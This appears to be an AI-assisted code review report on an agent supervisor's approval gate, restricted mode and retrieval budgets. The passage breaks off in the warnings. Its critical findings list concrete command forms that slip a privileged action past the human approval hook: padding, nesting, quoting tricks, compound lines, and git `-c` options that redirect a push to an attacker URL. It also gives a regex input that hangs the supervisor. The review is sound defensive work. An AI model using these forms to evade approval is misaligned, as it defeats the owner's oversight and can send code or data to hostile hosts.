---
phase: 04-profiles-retrieval-budgets-restricted-mode-and-the-portabili
reviewed: 2026-11-22T08:40:53Z
depth: standard
files_reviewed: 277
files_reviewed_list:
  - scripts/eval-retrieval.ts
  - scripts/exit-parity.ts
  - scripts/exit-run-phase4-tools.ts
  - scripts/exit-run-phase4.sh
  - scripts/status-bench.ts
  - src/adapters/context/git-files.ts
  - src/adapters/context/gsd-graph.ts
  - src/adapters/context/gsd-intel.ts
  - src/adapters/context/gsd-planning.ts
  - src/adapters/credential/cmd.ts
  - src/adapters/credential/delegated.ts
  - src/adapters/credential/handle.ts
  - src/adapters/credential/keychain.ts
  - src/adapters/diagnostics/probes.ts
  - src/adapters/exec/allowlist-proxy.ts
  - src/adapters/fs/artifact-store.ts
  - src/adapters/fs/policy-sources.ts
  - src/adapters/fs/profile-bindings.ts
  - src/adapters/fs/profile-config.ts
  - src/adapters/fs/profile-paths.ts
  - src/adapters/fs/profile-registry.ts
  - src/adapters/fs/redacting-artifact-store.ts
  - src/adapters/git/promotion.ts
  - src/adapters/git/repo-identity.ts
  - src/adapters/git/run-source.ts
  - src/adapters/git/run-workspace.ts
  - src/adapters/git/staged-specs.ts
  - src/adapters/git/staging-base.ts
  - src/adapters/git/staging-clone.ts
  - src/adapters/git/staging-worktree.ts
  - src/adapters/gsd/gsd-onboarding.ts
  - src/adapters/gsd/locate.ts
  - src/adapters/host-claude/attended-hook-install.ts
  - src/adapters/host-claude/claude-host.ts
  - src/adapters/host-claude/hook-policy.ts
  - src/adapters/host-claude/launch-args.ts
  - src/adapters/host-claude/launch-preflight.ts
  - src/adapters/host-claude/stream-json.ts
  - src/adapters/host-claude/transcript-collector.ts
  - src/adapters/redaction/process-redactor.ts
  - src/adapters/schedule/launchd.ts
  - src/adapters/sqlite/approval-rows.ts
  - src/adapters/sqlite/events.ts
  - src/adapters/sqlite/ledger.ts
  - src/adapters/sqlite/migrations/0004-profiles.ts
  - src/app/authorize.ts
  - src/app/budget.ts
  - src/app/capabilities.ts
  - src/app/checks.ts
  - src/app/context.ts
  - src/app/credentials.ts
  - src/app/deps.ts
  - src/app/doctor.ts
  - src/app/invocation.ts
  - src/app/manual-inputs.ts
  - src/app/onboarding-decision.ts
  - src/app/onboarding-service.ts
  - src/app/refresh.ts
  - src/app/resource-limits.ts
  - src/app/resume-refs.ts
  - src/app/resume.ts
  - src/app/retrieval-guard.ts
  - src/app/run-gsd-config.ts
  - src/app/run-host.ts
  - src/app/run-resume.ts
  - src/app/run-stages/item.ts
  - src/app/run-stages/prepare.ts
  - src/app/run-stages/restricted.ts
  - src/app/run-start.ts
  - src/app/run-status.ts
  - src/app/stages/activate.ts
  - src/app/stages/contract.ts
  - src/app/stages/index-code-graph.ts
  - src/app/stages/index-knowledge.ts
  - src/app/stages/index-stage.ts
  - src/app/stages/index-steps.ts
  - src/app/stages/map.ts
  - src/app/stages/promote.ts
  - src/app/stages/register.ts
  - src/app/stages/shared.ts
  - src/app/stages/stage.ts
  - src/app/stages/validate.ts
  - src/app/stages/workspace.ts
  - src/app/status.ts
  - src/cli/args.ts
  - src/cli/commands/approve.ts
  - src/cli/commands/comment.ts
  - src/cli/commands/context.ts
  - src/cli/commands/doctor.ts
  - src/cli/commands/evidence.ts
  - src/cli/commands/init.ts
  - src/cli/commands/install-host.ts
  - src/cli/commands/onboard.ts
  - src/cli/commands/pr.ts
  - src/cli/commands/repo.ts
  - src/cli/commands/schedule.ts
  - src/cli/commands/start.ts
  - src/cli/composition.ts
  - src/cli/doctor-deps.ts
  - src/cli/identity.ts
  - src/cli/main.ts
  - src/cli/manual-command.ts
  - src/cli/profile-gate.ts
  - src/cli/render/run-view.ts
  - src/cli/render/status-view.ts
  - src/cli/shell/history.ts
  - src/cli/spawn-supervisor.ts
  - src/domain/action-class.ts
  - src/domain/approval.ts
  - src/domain/brief.ts
  - src/domain/cache-scope.ts
  - src/domain/capability-requirements.ts
  - src/domain/chunk-packing.ts
  - src/domain/context-adapters.ts
  - src/domain/credential-ref.ts
  - src/domain/enforcement-map.ts
  - src/domain/graph-merge.ts
  - src/domain/gsd-version.ts
  - src/domain/hook-decision.ts
  - src/domain/host-admission.ts
  - src/domain/ids.ts
  - src/domain/invocation-scope.ts
  - src/domain/knowledge-corpus.ts
  - src/domain/knowledge-extraction.ts
  - src/domain/knowledge-validation.ts
  - src/domain/mapping.ts
  - src/domain/onboarding-contract.ts
  - src/domain/path-references.ts
  - src/domain/policy.ts
  - src/domain/preflight.ts
  - src/domain/privileged-commands.ts
  - src/domain/profile.ts
  - src/domain/project-record.ts
  - src/domain/redactor.ts
  - src/domain/refresh-plan.ts
  - src/domain/resource-bounds.ts
  - src/domain/restricted-specs.ts
  - src/domain/retrieval-rules.ts
  - src/domain/run-contract.ts
  - src/domain/run-lifecycle.ts
  - src/domain/secret-patterns.ts
  - src/domain/validation.ts
  - src/hook/pre-tool-use.ts
  - src/ports/agent-host.ts
  - src/ports/artifact-store.ts
  - src/ports/capability.ts
  - src/ports/context-source.ts
  - src/ports/credential-provider.ts
  - src/ports/diagnostics.ts
  - src/ports/egress-proxy.ts
  - src/ports/gsd-onboarding.ts
  - src/ports/ledger.ts
  - src/ports/run-source.ts
  - src/ports/run-workspace.ts
  - src/ports/staging-workspace.ts
  - test/benchmark/phase4/ac14-repositories.json
  - test/benchmark/phase4/eval-results.json
  - test/benchmark/phase4/eval-tasks.json
  - test/containment/failclosed.test.ts
  - test/containment/live-run-phase4.jsonl
  - test/containment/live-run-phase4.test.ts
  - test/containment/live-spend-phase4.jsonl
  - test/contract/artifact-store.cases.ts
  - test/contract/command-executor.cases.ts
  - test/contract/fake-remote.test.ts
  - test/contract/local.test.ts
  - test/fault/approval-consume.test.ts
  - test/fault/migrations.test.ts
  - test/fault/privileged-no-replay.test.ts
  - test/fault/retrieval-race.test.ts
  - test/fixtures/claude-fake/claude-replay.mjs
  - test/fixtures/json-shapes/context-active.json
  - test/fixtures/json-shapes/doctor.json
  - test/fixtures/knowledge.ts
  - test/fixtures/org-acme/config.json
  - test/fixtures/org-acme/policy-invalid.json
  - test/fixtures/org-acme/policy.json
  - test/helpers/approval-consume-child.ts
  - test/helpers/doctor-fixtures.ts
  - test/helpers/fake-claude.ts
  - test/helpers/fake-gsd-core.ts
  - test/helpers/fake-remote-artifact-store.ts
  - test/helpers/fake-remote-executor.ts
  - test/helpers/live-harness.ts
  - test/helpers/retrieval-fixtures.ts
  - test/helpers/retrieval-race-child.ts
  - test/helpers/secret-corpus.ts
  - test/helpers/seeded-faults.ts
  - test/helpers/stamped-map-fixture.ts
  - test/helpers/test-cli.ts
  - test/integration/approvals.test.ts
  - test/integration/artifact-redaction.test.ts
  - test/integration/cache-scope.test.ts
  - test/integration/claude-host.test.ts
  - test/integration/contained-onboarding-no-specs.test.ts
  - test/integration/context-adapters.test.ts
  - test/integration/context-handle-first.test.ts
  - test/integration/credential-broker.test.ts
  - test/integration/doctor-versions.test.ts
  - test/integration/doctor.test.ts
  - test/integration/event-redaction.test.ts
  - test/integration/graph-incremental.test.ts
  - test/integration/hook-privileged.test.ts
  - test/integration/hook-retrieval.test.ts
  - test/integration/init.test.ts
  - test/integration/knowledge-cost-cap.test.ts
  - test/integration/knowledge-pass.test.ts
  - test/integration/knowledge-refresh.test.ts
  - test/integration/ledger-status.test.ts
  - test/integration/manual-equivalents.test.ts
  - test/integration/onboard-adopt.test.ts
  - test/integration/portability-proof.test.ts
  - test/integration/preflight.test.ts
  - test/integration/profile-isolation.test.ts
  - test/integration/profile-propagation.test.ts
  - test/integration/profile-selection.test.ts
  - test/integration/promotion.test.ts
  - test/integration/redaction-suite.test.ts
  - test/integration/refresh-scoped.test.ts
  - test/integration/resource-degradation.test.ts
  - test/integration/restricted-mode.test.ts
  - test/integration/restricted-onboarding.test.ts
  - test/integration/retrieval-caps.test.ts
  - test/integration/run-capability-gate.test.ts
  - test/integration/run-deps.test.ts
  - test/integration/run-invocation.test.ts
  - test/integration/run-resume-refs.test.ts
  - test/integration/run-sandbox-other-profiles.test.ts
  - test/integration/run-start.test.ts
  - test/integration/schedule.test.ts
  - test/integration/skeleton.test.ts
  - test/integration/staged-specs.test.ts
  - test/integration/staging-adapters.test.ts
  - test/integration/status-queries.test.ts
  - test/integration/transcript-retention.test.ts
  - test/integration/untrusted-authority.test.ts
  - test/mutation/fail-closed.test.ts
  - test/unit/action-class.test.ts
  - test/unit/approval.test.ts
  - test/unit/capability-requirements.test.ts
  - test/unit/claude-settings.test.ts
  - test/unit/credential-ref.test.ts
  - test/unit/edge-rules.test.ts
  - test/unit/enforcement-map.test.ts
  - test/unit/eval-retrieval.test.ts
  - test/unit/exit-run-phase4-tools.test.ts
  - test/unit/extensions-namespace.test.ts
  - test/unit/footprint.test.ts
  - test/unit/graph-merge.test.ts
  - test/unit/hook-decision.test.ts
  - test/unit/host-admission.test.ts
  - test/unit/invocation-scope.test.ts
  - test/unit/json-shapes.test.ts
  - test/unit/knowledge-corpus.test.ts
  - test/unit/knowledge-cost-cap.test.ts
  - test/unit/knowledge-extraction.test.ts
  - test/unit/live-admission-override.test.ts
  - test/unit/live-spend-ceiling.test.ts
  - test/unit/mapper-secrets-rule.test.ts
  - test/unit/mapping.test.ts
  - test/unit/onboarding-contract-delete.test.ts
  - test/unit/path-references-plausibility.test.ts
  - test/unit/phase4-exit-inputs.test.ts
  - test/unit/policy-precedence.test.ts
  - test/unit/port-descriptors.test.ts
  - test/unit/preflight.test.ts
  - test/unit/profile-config.test.ts
  - test/unit/profile-registry.test.ts
  - test/unit/profile.test.ts
  - test/unit/redactor.test.ts
  - test/unit/refresh-plan.test.ts
  - test/unit/resource-bounds.test.ts
  - test/unit/restricted-specs.test.ts
  - test/unit/retrieval-rules.test.ts
  - test/unit/run-lifecycle.test.ts
  - test/unit/run-scope.test.ts
  - test/unit/stream-json.test.ts
findings:
  critical: 5
  warning: 42
  info: 28
  total: 75
status: issues_found
---

# Phase 04: Code Review Report

**Reviewed:** 2026-11-22T08:40:53Z
**Depth:** standard
**Files Reviewed:** 277
**Status:** issues_found

## Summary

Scope: the 308 files named in the 39 plan SUMMARY key-files (the evaluation scope, base `021045c`, added none); the 277 code, test and data files among them were reviewed, and markdown under docs/ and spikes/ was left to the documentation plan's prose review. Because of its size the scope was split across eight parallel `gsd-code-reviewer` agents (sonnet, standard depth), and their reports are merged here with findings renumbered by severity. The part tag on each finding names the area. The orchestrator reproduced two Criticals: `classifyCommandLine('true; git push origin main && npm publish')` returns only `git.push`, and the planning heading regex takes about 1.6 s on a 2,000-space line. Report-only run: nothing was fixed.

Context for triage: the attended-mode classifier findings (CR-01 to CR-04, WR-01 to WR-04) fall under the accepted obfuscated-shell bypass (T-04-53, AR-04-02 in 04-SECURITY.md) only where the shell form is deliberately obfuscated. Compound lines, an over-length line, the quoted `)` and the unbound push target are plain forms, so they are reported as defects of the gate itself.

| Part | Area | Critical | Warning | Info |
|------|------|----------|---------|------|
| A | src/domain | 3 | 6 | 3 |
| B | src/app (top level) | 0 | 5 | 3 |
| C | src/app/run-stages, src/app/stages | 0 | 3 | 2 |
| D | src/adapters/{sqlite,fs,credential,redaction,exec,diagnostics,schedule}, src/hook | 1 | 3 | 3 |
| E | src/adapters/{git,host-claude,context,gsd} | 1 | 6 | 2 |
| F | src/cli/**, src/ports | 0 | 4 | 3 |
| G | scripts/, test/helpers, test/fixtures, test/contract | 0 | 10 | 6 |
| H | test/{unit,integration,fault,mutation,benchmark,containment} | 0 | 5 | 6 |

**Part A (src/domain).** The 35 domain files are mostly small, careful pure modules (policy, retrieval rules, resource bounds, cache scope, host admission, restricted specs, refresh plan): input is validated, prototype keys are handled with `Object.hasOwn`, and the policy evaluator fails closed. The weight of the findings is in `privileged-commands.ts`, the shell parser that decides whether a command is a privileged action and what an approval binds. It is the only gate in attended mode, and it has several fail-open paths that I reproduced by running the module under Node:  - A shell line longer than 65,536 characters classifies as nothing, and the attended hook has no length check ahead of it. - Nesting deeper than 8 levels, or a double-quoted `)` inside a `$(...)`, hides the privileged command. - The approval digest ignores git's global options (`-c`, `-C`, `--git-dir`) and leading environment assignments, which can redirect the push.  Smaller defects are in `knowledge-corpus.ts` (a NaN chunk limit that removes the cost cap), `hook-decision.ts` (the broad-discovery gate is bypassed by a `glob` filter that matches everything) and `profile.ts`.

**Part B (src/app (top level)).** Reviewed the top-level `src/app` modules changed or added in phase 04 (approval gate, retrieval guard, context assembler, manual inputs, doctor, credential broker, resume reconciliation, run start/status). No authorization bypass, injection, path traversal or secret leak was found in these modules. The credential broker never records a value, the PR URL parser is strict, the approval digest binds scope, action and canonical parameters, and the restricted/contained host separation holds in `run-host.ts`.  The defects found are fail-open or inconsistent edges in the recovery and containment paths: the onboarding resume reaps nothing when the host is absent while the run resume fails closed; the no-replay rule lives only in one caller rather than in the gate; a path-scoped map silently falls back to the full read scope; and a run already blocked on another reason is not re-blocked by an interrupted privileged action. Several are not reachable with today's callers (only promotion calls `authorizeAction`), which is why none is rated BLOCKER, but each is a latent hole in a security-relevant control.

**Part C (src/app/run-stages, src/app/stages).** Reviewed the phase 04 changes to the run stages (context pack budget and manual excerpts, restricted run, enforcement/capability gate) and the onboarding stages (restricted map, refresh planning, incremental code graph, knowledge reuse and salvage, promotion). The security-sensitive seams hold up. A restricted run never reaches the contained road: `contractReadyStage` reads the mode from the stored contract, the block reason is `enforcement_failure`, which `isBlockedRunContinuable` refuses, and nothing falls back from the restricted host to `deps.host`. Promotion is gated by `authorizeAction`, its paths are re-validated in the adapter, and it is create-only. The knowledge salvage reads only chunk outputs whose names are pinned to a fixed pattern. No injection, traversal or secret-leak defect was found in these files. The defects below are robustness and completeness gaps in the new restricted run and in promotion.

**Part D (src/adapters/{sqlite,fs,credential,redaction,exec,diagnostics,schedule}, src/hook).** Reviewed the phase-04 changes to the credential providers, redaction wiring, approval rows and migration 0004, the ledger additions (approvals, task refs, status loader, spend, event bound), the artifact quota, the profile/bindings/policy file readers, diagnostics probes, the launchd profile variable, and the PreToolUse hook (privileged denial, retrieval charging, attended mode).  Most of the new code is carefully written: files are opened with `O_NOFOLLOW`, sizes are capped, approvals are consumed under `BEGIN IMMEDIATE` with a re-checked `UPDATE`, the migration trigger blocks deletion and re-pointing of approval rows, credential names are validated by `parseCredentialRef` before they reach `spawn` or `join`, and secrets are kept out of argv and stderr. One authorization gap exists in the attended-mode hook: an approval for one privileged action is spent on a shell line that holds several. Three warnings concern a lost-update race in the bindings registry, a spurious credential failure in the `cmd` provider, and a deny-list gap in the profile registry.

**Part E (src/adapters/{git,host-claude,context,gsd}).** Part E covers the context adapters (`git-files`, `gsd-graph`, `gsd-intel`, `gsd-planning`), the git adapters (promotion, staged specs, run workspace, repo identity), the GSD locator and the Claude host adapter (restricted mode, launch args, preflight, transcript collector, attended hook install).  The git, host and launch code is largely careful. Argv is built as arrays, every git call goes through `runGit`, symlinks are refused with `O_NOFOLLOW` and `lstat`, the launch-argument judges refuse the dangerous flags, and the attended-hook install writes atomically. I examined and rejected two suspected defects. A newline in a committed file name cannot forge a `git grep -z` row, because the forged row must begin with the commit id being searched and that id depends on the file name. The hit-cap truncation flag is also correct.  The real problems are concentrated in the new `gsd-planning` adapter, which parses attacker-controlled Markdown synchronously in the supervisor. There it has a confirmed catastrophic-backtracking regex. The untrusted-data marking is also inconsistent across the context adapters, and the promotion path checker is weaker than its sibling checkers at the one boundary that writes into the user's checkout.

**Part F (src/cli/**, src/ports).** The phase-4 CLI changes are largely sound: the profile gate reads only config files and safe git, so a refusal opens no store; the approval command refuses inside a run, without a terminal and from a run's process tree before a profile is resolved; the credential and retention sections are parsed before a store is opened; the foreign-store refusal runs before any migration; and the organization-policy loader fails closed (an enterprise profile with a missing organization file denies privileged actions). The `src/ports` changes are interface declarations that match their implementations where checked (`grantApproval`, `revokeApproval`, `findApprovalRequest`).  No critical defects were found. The warnings concern an inconsistent run-refusal on a command that now writes executable hook configuration into the owner's Claude settings, an unvalidated hook path that can lock the owner out of Bash in attended sessions, `doctor` being unable to run when the very registry it should diagnose is corrupt, and a mislabelled not-found message in `approve`.

**Part G (scripts/, test/helpers, test/fixtures, test/contract).** The live harnesses are generally careful. Task lists are digest-pinned and approval-checked, git object-store isolation is verified with `assertNoLeak`, and both live drivers check the Phase 4 ceiling before each model step. No path-traversal or injection defect was found in the argv/path handling; `safeRelative` and the 40-hex SHA checks hold.  The main weaknesses are:  1. Spend accounting that can under-record real spend in several failure paths. 2. Verdict arithmetic that treats infrastructure failures and unequal run counts as task results. 3. Spend authorization that is only as strong as a JSON file the agent can write. 4. An isolation claim in `prepareArmWorkspace` that is not true of the git history. 5. Fake-remote fault injection whose "duplicate" fault changes nothing, so the tests that claim to prove duplicate tolerance pass vacuously.  No Critical (must-block) defect was found. WR-03, WR-04, WR-06 and WR-07 concern the money guard and should be fixed before the Phase 4 ceiling is relied on.

**Part H (test/{unit,integration,fault,mutation,benchmark,containment}).** Part H is the phase's test suites (unit, integration, fault, mutation, containment, benchmark data). I read in full the security-relevant suites (profile-isolation, redaction-suite, event-redaction, artifact-redaction, approvals, approval-consume, privileged-no-replay, hook-privileged, hook-retrieval, retrieval-caps, retrieval-race, restricted-mode, restricted-onboarding, credential-broker, untrusted-authority, cache-scope, profile-propagation, portability-proof, the new migration 0004 cases, the run-sandbox moved-roots cases, live-run-phase4), read the diffs of every modified pre-existing test, and scanned all 98 files mechanically for tests without assertions, `async` callbacks that are not awaited, unawaited `assert.rejects`, early `return` guards, and un-restored `process.env` writes. I also ran `node --test "test/unit/**/*.test.ts"` (2875 tests, 0 failures, about 146 s) and reproduced the known `doctor-versions` flake. The large suites I only sampled or skimmed (knowledge-*, context-adapters, context-handle-first, graph-merge, footprint, manual-equivalents, schedule, ledger-status, status-queries, run-start, run-invocation, run-resume-refs, promotion, onboard-adopt, profile-selection, the benchmark JSON) were not read line by line.  Overall the security suites are well built: they carry positive controls (profile-isolation, redaction-suite), exact error-text oracles (approval-consume, privileged-no-replay), per-iteration race repeats (hook-retrieval), and byte-identical before/after checkouts (restricted-mode). No test was found that cannot fail through a missing await, an unawaited rejection or a swallowed assertion. The defects found are: one reproducible timing flake with a confirmed root cause, one source scan that silently misses two `artifacts.put` call sites (the guard that is supposed to force a redaction decision for every new artifact kind), early-`return` guards in credential-ref tests that skip assertions, one weak "denied" oracle, and two race tests that pass when the processes run one after the other. No BLOCKER-class defect was found in the test code.

## Narrative Findings (AI reviewer)

## Critical Issues

### CR-01: Attended hook allows any privileged command longer than 65,536 characters, and the parser fails open past its nesting and wrapper limits (part A)

**File:** `src/domain/privileged-commands.ts:45,46,83,173-178,204` (caller `src/hook/pre-tool-use.ts:546`)
**Issue:** `commandsOf` returns `[]` for a line over `MAX_COMMAND_CHARS` (65,536). Its comment says "the hook refuses such a line before it asks". That holds only for `decideShell` in `hook-decision.ts`, which rejects at 16,384 characters. The attended path (`attendedPreToolUse`, `pre-tool-use.ts:546`) calls `classifyCommandLine(command)` directly, with no length check. On `null` it returns without output, so the host runs the command with no approval request.

I ran `classifyCommandLine('git push origin main #' + 'x'.repeat(70000))` and got `null`. The same command with 100 padding characters is classified as `git.push`.

Two more limits fail open the same way, and I reproduced both:

- `splitInto` returns without recording anything when `depth > MAX_NESTING` (8). `echo $($($($($($($($($(git push))))))))))` with 10 levels returns `null`.
- `programWords` gives up after 16 wrapper or assignment words (the `for` guard at line 204) and returns the remaining words, which are not the program. Seventeen leading `command` words in front of `git push` bypass the check.

Any model-authored Bash call can use these. They defeat the whole purpose of the attended-mode approval gate (FR-12, S-4).

**Fix:** Make every limit return a refusal instead of "not privileged". Return a tri-state, or throw a typed error that callers map to deny.

```ts
export type Classification = { kind: 'none' } | { kind: 'privileged'; command: PrivilegedCommand } | { kind: 'unparseable' };
// commandsOf: length > MAX, depth > MAX_NESTING and the programWords guard all yield 'unparseable'.
```

In `attendedPreToolUse`, treat `unparseable` as a deny with its own rule (for example `privileged:unparseable`). Apply the same handling in `decideShell`. Do not rely on the caller's earlier length check.

### CR-02: A double-quoted `)` inside `$(...)` makes the splitter lose the rest of the line, hiding a privileged command (part A)

**File:** `src/domain/privileged-commands.ts:49-67,121-124,135-140`
**Issue:** `closingParen` skips single-quoted spans and backslashes but not double-quoted ones. For `echo $(echo ")"; git push)` it returns the `)` inside the quotes as the end of the substitution. The outer scanner resumes at `"; git push)`, treats the `"` as the start of a double-quoted word, and swallows `; git push)` to the end of the text. `git push` is never emitted as a command.

Output of `classifyCommandLine('echo $(echo ")"; git push)')` is `null`. Bash runs the push. The same defect exists in the double-quoted substitution branch at lines 121-124, which also uses `closingParen`. Because the text is literal, it is not one of the documented "computed name" bypasses.

**Fix:** Teach `closingParen` and `closingBacktick` to skip double-quoted spans, honoring `\"` and nested `$(`:

```ts
} else if (c === '"') {
  i += 1;
  while (i < text.length && text[i] !== '"') {
    if (text[i] === '\\') i += 1;
    else if (text[i] === '$' && text[i + 1] === '(') i = closingParen(text, i + 2);
    i += 1;
  }
}
```

Then add the line above as a regression test.

### CR-03: The approval digest omits git global options and leading environment assignments, so an approved push can go to a different target (part A)

**File:** `src/domain/privileged-commands.ts:296-308,348-358,360-373` (consumed by `src/domain/approval.ts:17` and `src/hook/pre-tool-use.ts:546-575`)
**Issue:** The comments say an approval binds "the target of the effect (remote and refspec ...)". `classifyGit` drops everything before the subcommand: `-C dir`, `-c name=value`, `--git-dir`, `--work-tree`, `--config-env`. `programWords` discards leading `NAME=value` words. None of these reach `params`.

Consequences, with the same digest as the plain command:

- `git -c remote.origin.url=https://attacker/x.git push origin main`, or `-c url.<base>.insteadOf=...`, pushes to another host.
- `git -C /other/repo push origin main` pushes a different repository.
- `GIT_SSH_COMMAND=... git push`, `GIT_DIR=... git push` and `GH_REPO=evil/repo gh pr create` change what the same words act on.

The owner approves what `paramsSummary` shows (`remote=origin refspec=main`). The model then runs a command with the same digest and a different effect. The same laundering applies to `git push --receive-pack=.../--exec=...` (valued options bound to `null`) and to every `gh` option whose value is dropped, such as `--hostname`.

**Fix:** Bind these inputs, or refuse to classify the command as approvable when they are present.

- Record `-c`/`--config-env` entries whose name starts with `remote.`, `url.` or `core.sshcommand`, plus `-C`, `--git-dir` and `--work-tree` values, as params (for example `gitDir`, `config`).
- Record any leading assignment whose name starts with `GIT_` or `GH_` as `env`.
- Treat `--receive-pack`/`--exec` as bound values rather than `null`.

Also decide explicitly what the approval binds for `gh api` (see WR-04).

### CR-04: Attended hook lets one approval authorize every privileged command in a compound shell line (part D)

**File:** `src/hook/pre-tool-use.ts:546-567` (classifier at `src/domain/privileged-commands.ts:403-409`)
**Issue:** `attendedPreToolUse` calls `classifyCommandLine(command)`, which returns only the FIRST privileged action found on the line. The approval digest, the approval request shown to the owner, and the consume at line 559 all cover that single action. When the approval is consumed the hook prints nothing, so the whole line runs. I confirmed with `classifyCommandLine('true; git push origin main && npm publish')`, which returns only `{"action":"git.push","params":{"remote":"origin","refspec":"main"}}`, and with `'echo ok && npm publish'` (`release.publish`). Sequence: the model submits `git push origin main && npm publish`. The hook denies it and records a request whose summary reads `refspec=main remote=origin`. The owner approves a plain push. The model resubmits the same line and the hook consumes the push approval and exits silently, so `npm publish` and any further privileged form (`gh pr create`, `gh release create`) run with no approval of their own. This defeats FR-12 (parameter-bound, single-use approvals) and T-04-50 in the owner's own session. The owner also never sees the second action in the summary. Run mode is not affected, because any privileged form is denied there.
**Fix:** Classify every command of the line, not the first. Add `classifyAllCommands(command): PrivilegedCommand[]` beside `classifyCommandLine` in `src/domain/privileged-commands.ts`, and in `attendedPreToolUse` consume one approval per privileged command inside the same transaction, all or none:
```ts
const found = classifyAllCommands(command);       // [] => allow
requestId = inTransaction(db, () => {
  const nowMs = Date.now();
  const taken = [];
  for (const p of found) {
    const digest = paramsDigest(p.params);
    const c = consumeApprovalRow(db, { scope, action: p.action, paramsDigest: digest, nowMs, startEvent: { /* ... */ } });
    if (c === null) {
      // roll back the approvals already taken: throw a sentinel, or record the denial for p and return its requestId
      throw new Unapproved(p);
    }
    taken.push(c);
  }
  return null;
});
```
The catch handler must roll back and then record the denial request for the first unapproved action in a fresh transaction. A simpler alternative is to deny any line that holds more than one privileged action, with a reason telling the model to issue them as separate calls.

### CR-05: Catastrophic regex backtracking in the planning-section heading parser hangs the supervisor on a hostile repository (part E)

**File:** `src/adapters/context/gsd-planning.ts:147`
**Issue:** `sectionsOf` runs `/^#{1,6}[ \t]+(.+?)[ \t]*#*[ \t]*$/` on every line of `.planning/PROJECT.md`, `REQUIREMENTS.md` and the current phase's `CONTEXT.md`, `PLAN.md` and `LEARNINGS.md`. These files are read from the staging copy, so a hostile repository controls them (the adapter's own header says planning text is untrusted). The lazy `(.+?)` is followed by two adjacent `[ \t]*` quantifiers over the same class, so a heading line that ends in a non-space after a run of spaces fails only after polynomial work.

I measured it in Node on `'# a' + ' '.repeat(n) + 'x'`:

| n | time |
|---|------|
| 1000 | 0.6 s |
| 2000 | 5 s |
| 4000 | 21 s |

The per-file cap is 256 KB, so a single 250 KB line effectively never returns. `find` and `refresh` are `async` but do all of this work synchronously. The assembler's `Promise.race` timeout in `src/app/context.ts` cannot interrupt synchronous code, so the whole supervisor process blocks. `refresh` re-parses the same file, so every later retry hangs as well. Any run or onboarding whose profile selects `gsd-planning` (the default is all four sources) and that stages a hostile checkout is affected.

**Fix:** Do not use a regex with overlapping unbounded quantifiers. Parse the heading by hand, in linear time:
```ts
function headingOf(line: string): string | null {
  const m = /^#{1,6}[ \t]+/.exec(line);
  if (m === null) return null;
  let text = line.slice(m[0].length).replace(/\r$/, '').trimEnd();
  // closing hashes only count when preceded by whitespace
  const closing = text.length;
  let i = closing;
  while (i > 0 && text[i - 1] === '#') i -= 1;
  if (i < closing && (i === 0 || text[i - 1] === ' ' || text[i - 1] === '\t')) text = text.slice(0, i).trimEnd();
  return text === '' ? null : text;
}
```
Also cap the line length that is parsed, for example treat a line over 2000 characters as body text. Add a regression test with a 200 KB whitespace-padded heading line.

## Warnings

### WR-01: Common literal wrappers and quoting forms are not parsed, so `git push` inside them is not seen (part A)

**File:** `src/domain/privileged-commands.ts:135-144,163-167,186-196`
**Issue:** The header lists only computed names, aliases and functions as documented bypasses, but these literal forms are also missed. I verified each returns `null`:

- `bash -c "git push"`, `sh -c ...` and `eval "git push"` take a literal string that is trivially parsable.
- `timeout 5 git push`, `xargs git push`, `setsid`, `stdbuf`, `ionice` and `flock` are wrappers like the ones already handled.
- `time -p git push`: `time` is a reserved word, but its `-p` option is not skipped, so the program is read as `-p`.
- `git $'push'` (ANSI-C quoting): the `$` is appended to the word, so the subcommand reads as `$push`.
- `constructor git push` is classified as a push, because `WRAPPERS['constructor']` resolves on the prototype; see WR-02.

**Fix:**
- Recurse into the `-c` argument of `sh`, `bash`, `zsh`, `dash` and `ksh`, and into the words of `eval`, by calling `commandsOf` on the string.
- Add `timeout` (skip its duration operand), `xargs`, `setsid`, `stdbuf`, `ionice` and `time` options to `WRAPPERS`.
- Handle `$'...'` and `$"..."` by dropping the `$` when it directly precedes a quote.
- Fix the header comment so it lists these as bypasses if they are deliberately left out.

### WR-02: Wrapper table lookup reads the prototype chain, so a command named `constructor` or `__proto__` crashes the classifier (part A)

**File:** `src/domain/privileged-commands.ts:188,212,234`
**Issue:** `WRAPPERS[wrapper]` is a plain-object lookup on text from the command line. For `constructor` or `__proto__` it returns `Object` or `Object.prototype`, not `undefined`. `valued.includes(arg)` then throws `TypeError: valued.includes is not a function`. I reproduced it with `classifyCommandLine('constructor -x')`. Without a dash argument the word is silently treated as a wrapper, which is why `constructor git push` is classified as a push.

In the contained hook the throw ends in exit 2 (a block), so it fails closed. In attended mode a model-chosen command can make the owner's hook crash. Lookups elsewhere in this phase use `Object.hasOwn` (`ruleFor`, `classifyAction`); this one was missed.

**Fix:**
```ts
const valued = Object.hasOwn(WRAPPERS, wrapper) ? WRAPPERS[wrapper] : undefined;
```
Or build `WRAPPERS` as a `Map`.

### WR-03: `npm publish` is not recognized when an unlisted valued option comes first (part A)

**File:** `src/domain/privileged-commands.ts:343-346,375-383`
**Issue:** `classifyNpm` takes the first positional of `parseArgs(args, NPM_PUBLISH)` and requires it to be `publish`. Any npm option that takes a separate value and is not in the `valued` list pushes its value into `positionals[0]`. `npm --scope @x publish` returns `null` (checked); `--fetch-retries 3`, `--cwd` and `--userconfig` behave the same. The list is a small sample of npm's options.

**Fix:** Look for `publish` among the positionals instead of requiring it first:
```ts
if (!parsed.positionals.includes('publish')) return null;
```
This is fail-safe, because a spurious match only asks for an approval. Also drop the recognized `publish` positional from `params` by index, not by key.

### WR-04: `gh api` approval binds endpoint and method but not the request body (part A)

**File:** `src/domain/privileged-commands.ts:335-338,366-372`
**Issue:** `--field`, `--raw-field` and `--input` values are bound to `null`, so they appear in no parameter. For `gh api graphql -f query=...` the endpoint is the constant `graphql` and the method is POST. One approval therefore authorizes any GraphQL mutation (delete repository, change branch protection), not the one the owner saw.

**Fix:** Bind a digest of the field names and values, or of the `--input` file's bytes, as a `body` parameter. Alternatively, mark `graphql` and `--input` forms as not approvable.

### WR-05: `knowledgeChunkLimit` returns NaN for a negative cost cap, which removes the cost cap (part A)

**File:** `src/domain/knowledge-corpus.ts:181-184` (caller `src/app/stages/index-knowledge.ts:260`, source `src/app/budget.ts:93,191`)
